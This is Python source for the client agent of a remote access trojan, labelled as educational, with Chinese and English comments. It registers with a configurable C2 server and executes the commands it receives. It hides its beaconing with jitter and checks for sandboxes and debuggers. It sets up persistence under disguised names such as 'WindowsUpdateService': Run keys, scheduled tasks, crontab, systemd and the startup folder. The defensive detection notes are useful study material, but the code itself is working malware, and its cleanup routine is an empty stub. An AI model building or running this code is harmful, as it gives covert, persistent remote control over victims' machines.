"""
============================================================================
 教育用途远程管理框架 - 客户端代理
 Educational Remote Administration Framework - Client Agent
============================================================================

 架构说明：
 ┌──────────────────────────────────────────────────────────┐
│  客户端代理 (Client Agent)                                │
│                                                          │
│  ┌──────────┐  ┌──────────┐  ┌──────────┐  ┌──────────┐ │
│  │ 连接管理  │  │ 心跳模块  │  │ 命令执行  │  │ 持久化   │ │
│  │          │  │          │  │          │  │(教育用途) │ │
│  │ 重连逻辑 │  │ 定时发送  │  │ shell    │  │ 注册表   │ │
│  │ 退避算法 │  │ 状态上报  │  │ sysinfo │  │ 计划任务 │ │
│  │ TLS 伪装│  │ 抖动混淆  │  │ 文件操作 │  │ 启动目录 │ │
│  └──────────┘  └──────────┘  └──────────┘  └──────────┘ │
│                                                          │
│  防守方检测点：                                           │
│  - 异常外连（非标准端口、非标准协议）                     │
│  - 心跳行为（周期性外连）                                 │
│  - 持久化痕迹（注册表 Run Key、计划任务）                 │
│  - 进程行为（隐藏窗口、反调试）                           │
└──────────────────────────────────────────────────────────┘

 学习目标：
 1. 理解 C2 客户端的完整生命周期
 2. 学习重连与退避策略
 3. 理解持久化机制的原理
 4. 了解反分析技术（以便防御）
 5. 学习如何检测这些行为
"""

import os
import sys
import json
import time
import uuid
import socket
import base64
import random
import ctypes
import hashlib
import logging
import platform
import traceback
import threading
from typing import Optional, Dict, Any
from pathlib import Path

from config import config
from crypto_utils import (
    SymmetricCrypto, SecureChannel, MessageType,
    MessagePacket, TrafficObfuscator
)
from commands import CommandDispatcher, CommandResult

logger = logging.getLogger(__name__)


# ============================================================================
# 系统信息收集 / System Information
# ============================================================================

class SystemInfoCollector:
    """
    系统信息收集器

    收集被控端的系统信息用于注册和上报。

    防守方检测：
    - 批量系统 API 调用
    - WMI 查询（Windows）
    - /proc 文件系统读取（Linux）
    """

    @staticmethod
    def collect() -> Dict[str, Any]:
        """收集系统信息"""
        info = {
            "client_id": config.client.client_id,
            "hostname": socket.gethostname(),
            "os": platform.platform(),
            "architecture": platform.machine(),
            "username": os.environ.get("USER", os.environ.get("USERNAME", "unknown")),
            "is_admin": SystemInfoCollector._check_admin(),
            "python_version": sys.version,
            "pid": os.getpid(),
        }

        # 网络信息
        try:
            info["local_ip"] = socket.gethostbyname(socket.gethostname())
        except Exception:
            info["local_ip"] = "unknown"

        return info

    @staticmethod
    def _check_admin() -> bool:
        """检查是否具有管理员权限"""
        try:
            if sys.platform == "win32":
                return ctypes.windll.shell32.IsUserAnAdmin() != 0
            else:
                return os.geteuid() == 0
        except Exception:
            return False


# ============================================================================
# 持久化机制（教育用途）/ Persistence Mechanisms (Educational)
# ============================================================================

class PersistenceManager:
    """
    持久化管理器

    教育用途：展示恶意软件常用的持久化技术，帮助理解如何检测和清除：

    1. 注册表 Run Key (Windows)
       → 检测：Sysmon Event 13，Autoruns 工具
    2. 计划任务 (Windows/Linux)
       → 检测：schtasks / crontab 审计
    3. 启动文件夹 (Windows)
       → 检测：文件系统监控
    4. systemd Service (Linux)
       → 检测：systemctl list-units
    5. Launch Daemon/Agent (macOS)
       → 检测：launchctl list

    ⚠ 教育警示：
    这些技术展示了恶意软件如何"存活"。
    了解这些技术有助于：
    - 识别异常持久化条目
    - 编写检测规则
    - 设计清除方案
    """

    @staticmethod
    def install(method: str, script_path: str) -> bool:
        """
        安装持久化

        Args:
            method: 持久化方式
            script_path: 要持久化的脚本路径
        """
        logger.warning(
            f"[PERSIST] Attempting {method} persistence - "
            "This is for EDUCATIONAL understanding of malware behavior"
        )

        try:
            if method == "registry_run_key" and sys.platform == "win32":
                return PersistenceManager._registry_run_key(script_path)
            elif method == "scheduled_task":
                return PersistenceManager._scheduled_task(script_path)
            elif method == "startup_folder" and sys.platform == "win32":
                return PersistenceManager._startup_folder(script_path)
            elif method == "crontab" and sys.platform != "win32":
                return PersistenceManager._crontab(script_path)
            elif method == "systemd" and sys.platform != "win32":
                return PersistenceManager._systemd_service(script_path)
            else:
                logger.error(f"Unsupported persistence method: {method}")
                return False
        except Exception as e:
            logger.error(f"Persistence installation failed: {e}")
            return False

    @staticmethod
    def _registry_run_key(script_path: str) -> bool:
        """
        Windows 注册表 Run Key 持久化

        检测方法：
        - reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
        - Sysinternals Autoruns
        - EDR 注册表监控
        """
        try:
            import winreg

            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE
            )

            # 使用伪装名称
            entry_name = "WindowsUpdateService"
            python_path = sys.executable
            value = f'"{python_path}" "{script_path}" --silent'

            winreg.SetValueEx(key, entry_name, 0, winreg.REG_SZ, value)
            winreg.CloseKey(key)

            logger.info(f"[PERSIST] Registry Run key added: {entry_name}")
            logger.info(
                "[DEFENSE] Detection: Monitor HKLM/HKCU\\...\\Run for "
                "unexpected entries with Python/powershell paths"
            )
            return True
        except ImportError:
            logger.error("winreg not available")
            return False

    @staticmethod
    def _scheduled_task(script_path: str) -> bool:
        """
        计划任务持久化

        Windows: schtasks
        Linux:   crontab / systemd timer

        检测方法：
        - Windows: schtasks /query, Event ID 4698
        - Linux: crontab -l, /etc/cron.*, systemctl list-timers
        """
        import subprocess

        task_name = "WindowsUpdateTask" if sys.platform == "win32" else "system-update-check"

        if sys.platform == "win32":
            python_path = sys.executable
            cmd = (
                f'schtasks /create /tn "{task_name}" /tr '
                f'"\\"{python_path}\\" \\"{script_path}\\" --silent" '
                f'/sc hourly /mo 2 /f'
            )
            result = subprocess.run(cmd, shell=True, capture_output=True)

            logger.info(
                f"[DEFENSE] Windows scheduled task '{task_name}' created. "
                "Detection: Monitor Event ID 4698 (task creation), "
                "check for tasks executing Python scripts from temp directories"
            )
            return result.returncode == 0
        else:
            # Linux: 添加 crontab
            cron_line = f"*/30 * * * * {sys.executable} {script_path} --silent\n"
            try:
                result = subprocess.run(
                    f'(crontab -l 2>/dev/null; echo "{cron_line}") | crontab -',
                    shell=True, capture_output=True,
                )
                logger.info(
                    "[DEFENSE] Crontab entry added. "
                    "Detection: Check 'crontab -l' for unexpected Python script entries"
                )
                return result.returncode == 0
            except Exception:
                return False

    @staticmethod
    def _startup_folder(script_path: str) -> bool:
        """
        Windows 启动文件夹持久化

        检测方法：
        - 检查 %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
        - Sysmon Event 11 (FileCreate) 在该目录
        """
        try:
            import shutil
            startup_folder = os.path.join(
                os.environ["APPDATA"],
                "Microsoft", "Windows", "Start Menu", "Programs", "Startup"
            )

            # 创建 .bat 启动脚本
            bat_path = os.path.join(startup_folder, "WindowsHelper.bat")
            with open(bat_path, 'w') as f:
                f.write(f'@echo off\n"{sys.executable}" "{script_path}" --silent\n')

            logger.info(
                f"[DEFENSE] Startup folder entry: {bat_path}. "
                "Detection: Monitor Startup folder for new .bat/.vbs/.ps1 files"
            )
            return True
        except Exception as e:
            logger.error(f"Startup folder persistence failed: {e}")
            return False

    @staticmethod
    def _crontab(script_path: str) -> bool:
        """Linux crontab 持久化（同 _scheduled_task）"""
        return PersistenceManager._scheduled_task(script_path)

    @staticmethod
    def _systemd_service(script_path: str) -> bool:
        """
        Linux systemd Service 持久化

        检测方法：
        - systemctl list-units --type=service | grep -v '^●'
        - 检查 /etc/systemd/system/ 中的非标准服务文件
        """
        import subprocess

        service_name = "system-update-checker"
        service_content = f"""[Unit]
Description=System Update Checker Service
After=network.target

[Service]
Type=simple
ExecStart={sys.executable} {script_path} --silent
Restart=always
RestartSec=30
User={os.environ.get('USER', 'root')}

[Install]
WantedBy=multi-user.target
"""

        service_path = f"/etc/systemd/system/{service_name}.service"
        try:
            # 需要 root 权限
            if os.geteuid() != 0:
                logger.warning("systemd persistence requires root privileges")
                return False

            with open(service_path, 'w') as f:
                f.write(service_content)

            subprocess.run(["systemctl", "daemon-reload"], capture_output=True)
            subprocess.run(["systemctl", "enable", service_name], capture_output=True)
            subprocess.run(["systemctl", "start", service_name], capture_output=True)

            logger.info(
                f"[DEFENSE] systemd service '{service_name}' installed. "
                "Detection: 'systemctl list-units --type=service', "
                "audit /etc/systemd/system/ for non-standard services"
            )
            return True
        except Exception as e:
            logger.error(f"systemd persistence failed: {e}")
            return False

    @staticmethod
    def cleanup_all(script_path: str):
        """
        清除所有持久化痕迹

        教育用途：学习如何进行事件响应和清除
        """
        logger.info("[CLEANUP] Removing persistence mechanisms...")
        # 这里省略具体实现，实际清除需要对每种方式进行反向操作
        pass


# ============================================================================
# 反分析技术（教育用途）/ Anti-Analysis (Educational)
# ============================================================================

class AntiAnalysis:
    """
    反分析检测

    教育用途：理解恶意软件如何检测沙箱/调试环境。

    防守方要点：
    - 沙箱应模拟真实环境特征
    - 调试器应隐藏调试标志
    - 行为分析应记录所有检测尝试
    """

    @staticmethod
    def detect_sandbox() -> bool:
        """
        沙箱检测

        检测方法（防守方可逆向这些检测逻辑）：
        1. 检查系统运行时间（沙箱通常刚启动）
        2. 检查 CPU 核心数（沙箱常为 1-2 核）
        3. 检查内存大小（沙箱内存通常较小）
        4. 检查是否有用户交互（鼠标移动、键盘输入）
        5. 检查进程数量（沙箱进程较少）
        """
        if not config.client.anti_sandbox:
            return False

        indicators = []

        # 检查运行时间
        try:
            import psutil
            boot_time = psutil.boot_time()
            uptime = time.time() - boot_time
            if uptime < 600:  # 少于 10 分钟
                indicators.append(f"Short uptime: {uptime:.0f}s")
        except Exception:
            pass

        # 检查 CPU 核心数
        cpu_count = os.cpu_count() or 1
        if cpu_count < 2:
            indicators.append(f"Low CPU count: {cpu_count}")

        # 检查内存（MB）
        try:
            import psutil
            mem = psutil.virtual_memory()
            if mem.total < 2 * 1024 * 1024 * 1024:  # < 2GB
                indicators.append(f"Low memory: {mem.total / (1024**3):.1f}GB")
        except Exception:
            pass

        if indicators:
            logger.info(f"[ANTI-SANDBOX] Sandbox indicators: {indicators}")
            return True

        return False

    @staticmethod
    def detect_debugger() -> bool:
        """
        调试器检测

        检测方法（防守方应了解这些技术）：
        1. IsDebuggerPresent() (Windows API)
        2. 检查 PTRACE_TRACEME (Linux)
        3. 检查 /proc/self/status 中的 TracerPid (Linux)
        4. 时间检测（调试器会使执行变慢）
        5. 断点检测（0xCC 指令扫描）
        """
        if not config.client.anti_debug:
            return False

        indicators = []

        if sys.platform == "win32":
            try:
                if ctypes.windll.kernel32.IsDebuggerPresent():
                    indicators.append("IsDebuggerPresent=True")
            except Exception:
                pass
        else:
            # Linux: 检查 ptrace 状态
            try:
                with open("/proc/self/status", "r") as f:
                    for line in f:
                        if line.startswith("TracerPid:"):
                            pid = int(line.split(":")[1].strip())
                            if pid != 0:
                                indicators.append(f"TracerPid={pid}")
                            break
            except Exception:
                pass

        if indicators:
            logger.warning(f"[ANTI-DEBUG] Debugger detected: {indicators}")
            return True

        return False


# ============================================================================
# 客户端核心 / Client Core
# ============================================================================

class ClientAgent:
    """
    C2 客户端代理

    核心职责：
    1. 与 C2 服务端建立加密连接
    2. 注册并定期发送心跳
    3. 接收并执行命令
    4. 返回执行结果
    5. 断线重连（带退避策略）
    """

    def __init__(self):
        self._crypto = SymmetricCrypto(config.crypto.derived_key)
        self._channel: Optional[SecureChannel] = None
        self._dispatcher = CommandDispatcher()

        # 状态
        self._running = False
        self._connected = False
        self._registered = False

        # 重连控制
        self._reconnect_count = 0
        self._reconnect_stop_event = threading.Event()

        # 心跳
        self._heartbeat_thread: Optional[threading.Thread] = None

        logger.info(
            f"Client agent initialized | "
            f"ID: {config.client.client_id} | "
            f"Target: {config.client.callback_host}:{config.client.callback_port}"
        )

    # ------------------------------------------------------------------
    # 连接管理 / Connection Management
    # ------------------------------------------------------------------

    def connect(self) -> bool:
        """
        连接到 C2 服务器

        Returns: True if successfully connected and registered
        """
        import socket

        try:
            logger.info(
                f"Connecting to {config.client.callback_host}:"
                f"{config.client.callback_port}..."
            )

            # 创建 TCP socket
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(config.network.connect_timeout)
            sock.connect((
                config.client.callback_host,
                config.client.callback_port
            ))
            sock.settimeout(config.network.recv_timeout)

            logger.info("[+] TCP connection established")

            # 初始化安全通道
            self._channel = SecureChannel(self._crypto)

            # 注册
            if not self._register(sock):
                sock.close()
                return False

            self._connected = True
            self._reconnect_count = 0
            logger.info(f"[+] Registered with C2 as {config.client.client_id}")

            # 启动心跳线程
            self._start_heartbeat(sock)

            # 进入主消息循环
            self._message_loop(sock)

            return True

        except ConnectionRefusedError:
            logger.warning(f"Connection refused by {config.client.callback_host}")
            return False
        except socket.timeout:
            logger.warning("Connection timed out")
            return False
        except Exception as e:
            logger.error(f"Connection failed: {e}")
            return False

    def _register(self, sock: socket.socket) -> bool:
        """
        向 C2 服务器注册

        发送客户端系统信息供服务端管理
        """
        # 收集系统信息
        sysinfo = SystemInfoCollector.collect()
        logger.info(f"System info: {sysinfo['hostname']} | {sysinfo['os']}")

        # 发送 REGISTER 消息
        register_msg = self._channel.pack_message(
            MessageType.REGISTER,
            json.dumps(sysinfo).encode('utf-8')
        )
        sock.sendall(register_msg)

        # 等待 ACK
        try:
            response = sock.recv(4096)
            if not response:
                logger.error("Server closed connection during registration")
                return False

            packet = self._channel.unpack_message(response)
            if packet is None:
                logger.error("Failed to decrypt ACK")
                return False

            if packet.msg_type != MessageType.ACK:
                logger.error(f"Expected ACK, got {packet.msg_type:#04x}")
                return False

            logger.info(f"Registration acknowledged: {packet.payload.decode('utf-8', errors='replace')}")
            self._registered = True
            return True

        except socket.timeout:
            logger.error("Registration timeout")
            return False

    # ------------------------------------------------------------------
    # 心跳管理 / Heartbeat Management
    # ------------------------------------------------------------------

    def _start_heartbeat(self, sock: socket.socket):
        """启动心跳线程"""
        self._heartbeat_thread = threading.Thread(
            target=self._heartbeat_loop,
            args=(sock,),
            daemon=True,
            name="heartbeat-thread"
        )
        self._heartbeat_thread.start()

    def _heartbeat_loop(self, sock: socket.socket):
        """
        心跳循环（独立线程）

        教育要点：
        - 攻击者使用心跳维持 C2 连接
        - 防守方可检测异常的周期性外连行为
        - 抖动 (jitter) 用于逃避基于固定间隔的检测
        """
        logger.info("Heartbeat thread started")

        while self._connected:
            try:
                # 计算间隔（含抖动 - 逃避基于固定间隔的检测）
                delay = TrafficObfuscator.add_jitter(
                    config.network.heartbeat_interval,
                    jitter_ratio=0.3
                )

                # 睡眠（可被打断）
                if self._reconnect_stop_event.wait(timeout=delay):
                    break

                if not self._connected:
                    break

                # 发送心跳
                hb_msg = self._channel.pack_message(
                    MessageType.HEARTBEAT,
                    json.dumps({
                        "client_id": config.client.client_id,
                        "timestamp": time.time(),
                    }).encode('utf-8')
                )

                try:
                    sock.sendall(hb_msg)
                    logger.debug("Heartbeat sent")

                    # 等待服务器响应（可能携带待执行命令）
                    sock.settimeout(5.0)
                    response = sock.recv(4096)
                    if response:
                        self._handle_async_message(response)
                    sock.settimeout(config.network.recv_timeout)

                except (socket.timeout, BlockingIOError):
                    # 无待处理命令，正常
                    pass
                except (ConnectionError, OSError) as e:
                    logger.warning(f"Heartbeat failed: {e}")
                    self._connected = False
                    break

            except Exception as e:
                logger.error(f"Heartbeat error: {e}")
                break

        logger.info("Heartbeat thread stopped")

    def _handle_async_message(self, data: bytes):
        """处理心跳响应中的异步消息（待执行命令）"""
        try:
            packet = self._channel.unpack_message(data)
            if packet is None:
                return

            if packet.msg_type == MessageType.COMMAND:
                # 在新线程中执行命令
                threading.Thread(
                    target=self._execute_queued_command,
                    args=(packet,),
                    daemon=True
                ).start()

        except Exception as e:
            logger.error(f"Failed to handle async message: {e}")

    # ------------------------------------------------------------------
    # 消息循环 / Message Loop
    # ------------------------------------------------------------------

    def _message_loop(self, sock: socket.socket):
        """
        主消息循环

        接收来自 C2 服务端的命令并执行
        """
        logger.info("Entering message loop")

        try:
            while self._connected:
                try:
                    data = sock.recv(65536)
                    if not data:
                        logger.info("Server closed connection")
                        break

                    packet = self._channel.unpack_message(data)
                    if packet is None:
                        continue

                    if packet.msg_type == MessageType.COMMAND:
                        self._handle_command(sock, packet)
                    elif packet.msg_type == MessageType.ACK:
                        logger.debug(f"ACK: {packet.payload}")
                    else:
                        logger.debug(f"Unhandled message type: {packet.msg_type:#04x}")

                except socket.timeout:
                    continue
                except (ConnectionError, OSError) as e:
                    logger.warning(f"Connection lost: {e}")
                    break

        finally:
            self._connected = False
            logger.info("Message loop ended")

    # ------------------------------------------------------------------
    # 命令处理 / Command Handling
    # ------------------------------------------------------------------

    def _handle_command(self, sock: socket.socket, packet: MessagePacket):
        """
        处理来自 C2 服务端的命令

        解析命令 → 执行 → 返回结果
        """
        try:
            cmd_data = json.loads(packet.payload.decode('utf-8'))
        except json.JSONDecodeError:
            logger.error("Invalid command JSON")
            return

        cmd_id = cmd_data.get("command_id", "unknown")
        cmd_name = cmd_data.get("name", "")
        cmd_args = cmd_data.get("args", {})

        logger.info(f"[RECV] Command: {cmd_name} (id={cmd_id})")

        # 执行命令
        result: CommandResult = self._dispatcher.execute(
            cmd_id, cmd_name, cmd_args
        )

        # 发送结果
        try:
            response_data = result.to_json()
            response_msg = self._channel.pack_message(
                MessageType.RESPONSE,
                response_data
            )
            sock.sendall(response_msg)
            logger.info(
                f"[SENT] Result for {cmd_name}: "
                f"{'OK' if result.success else 'FAIL'} ({result.duration_ms:.0f}ms)"
            )
        except (ConnectionError, OSError) as e:
            logger.error(f"Failed to send command result: {e}")

    def _execute_queued_command(self, packet: MessagePacket):
        """执行队列中的命令（从心跳响应接收）"""
        # 简化实现：解析并执行（不发送结果，等主循环处理）
        try:
            cmd_data = json.loads(packet.payload.decode('utf-8'))
            cmd_name = cmd_data.get("name", "")
            logger.info(f"[QUEUED] Executing queued command: {cmd_name}")
            # 实际实现需要发送结果
        except Exception as e:
            logger.error(f"Queued command error: {e}")

    # ------------------------------------------------------------------
    # 重连逻辑 / Reconnection Logic
    # ------------------------------------------------------------------

    def run_with_reconnect(self):
        """
        带自动重连的主循环

        退避策略：指数退避 + 随机抖动 + 上限
        delay = min(base * 2^attempts + jitter, max_delay)

        教育要点：
        - 防守方检测：反复连接同一 IP 是 C2 通信的强特征
        - 攻击者可能轮换 C2 地址（Domain Generation Algorithm）
        """
        self._running = True

        while self._running:
            success = self.connect()

            if success:
                # 正常断开，等待后重连
                logger.info("Connection ended, reconnecting...")
                self._reconnect_count = 0
            else:
                # 连接失败
                self._reconnect_count += 1

                if (config.client.max_reconnect_attempts > 0 and
                        self._reconnect_count > config.client.max_reconnect_attempts):
                    logger.error(
                        f"Max reconnect attempts reached "
                        f"({config.client.max_reconnect_attempts})"
                    )
                    break

                # 计算退避延迟
                delay = min(
                    config.client.reconnect_base_delay *
                    (2 ** (self._reconnect_count - 1)),
                    config.client.reconnect_max_delay
                )
                # 添加随机抖动
                delay = TrafficObfuscator.add_jitter(delay, 0.2)

                logger.info(
                    f"Reconnect attempt {self._reconnect_count} "
                    f"in {delay:.1f}s"
                )

                if self._reconnect_stop_event.wait(timeout=delay):
                    break

        logger.info("Client agent stopped")

    def stop(self):
        """停止客户端"""
        logger.info("Stopping client agent...")
        self._running = False
        self._connected = False
        self._reconnect_stop_event.set()


# ============================================================================
# 主入口 / Main Entry Point
# ============================================================================

def main():
    """主函数"""
    import argparse

    parser = argparse.ArgumentParser(
        description="Educational Remote Administration Client Agent",
        epilog="FOR EDUCATIONAL USE ONLY - Use only on authorized systems",
    )
    parser.add_argument(
        "--host", "-H",
        default=config.client.callback_host,
        help=f"C2 server hostname (default: {config.client.callback_host})"
    )
    parser.add_argument(
        "--port", "-p",
        type=int,
        default=config.client.callback_port,
        help=f"C2 server port (default: {config.client.callback_port})"
    )
    parser.add_argument(
        "--silent",
        action="store_true",
        help="Run in silent mode (minimize output)"
    )
    parser.add_argument(
        "--persist",
        action="store_true",
        help="[EDUCATIONAL] Install persistence (demonstrates malware behavior)"
    )
    parser.add_argument(
        "--anti-sandbox",
        action="store_true",
        help="[EDUCATIONAL] Enable anti-sandbox detection"
    )
    parser.add_argument(
        "--no-color",
        action="store_true",
        help="Disable colored output"
    )
    args = parser.parse_args()

    # 更新配置
    config.client.callback_host = args.host
    config.client.callback_port = args.port
    config.client.silent_mode = args.silent
    config.client.anti_sandbox = args.anti_sandbox

    # 配置日志
    log_level = logging.WARNING if args.silent else logging.INFO
    logging.basicConfig(
        level=log_level,
        format='%(asctime)s [%(levelname)s] %(name)s: %(message)s',
    )

    # 打印横幅（非静默模式）
    if not args.silent:
        print(f"""
╔══════════════════════════════════════════════════════════════╗
║    教育用途远程管理框架 - 客户端代理 v{config.version:<6}     ║
║    Educational RAT Client Agent                              ║
║                                                              ║
║    ⚠  FOR EDUCATIONAL USE ONLY                              ║
║    仅限授权环境使用                                         ║
╚══════════════════════════════════════════════════════════════╝
        """.strip())

    # 反分析检测（教育用途）
    if config.client.anti_sandbox:
        if AntiAnalysis.detect_sandbox():
            logger.warning("[*] Sandbox detected, adjusting behavior")

    if config.client.anti_debug:
        if AntiAnalysis.detect_debugger():
            logger.warning("[*] Debugger detected, adjusting behavior")

    # 持久化安装（教育用途）
    if args.persist and config.client.enable_persistence:
        script_path = os.path.abspath(__file__)
        for method in config.client.persistence_methods:
            success = PersistenceManager.install(method, script_path)
            if success:
                logger.info(f"  [+] {method} persistence installed")
            else:
                logger.warning(f"  [-] {method} persistence failed")

        logger.warning(
            "\n[DEFENSE NOTE] Persistence mechanisms have been installed.\n"
            "This is for educational purposes to understand how malware\n"
            "maintains access. To clean up:\n"
            "  - Windows: Use Autoruns, check registry Run keys\n"
            "  - Linux: Check crontab, systemd services\n"
        )

    # 启动客户端
    agent = ClientAgent()

    try:
        agent.run_with_reconnect()
    except KeyboardInterrupt:
        print("\n[*] Client stopped by user")
    finally:
        agent.stop()


if __name__ == "__main__":
    main()
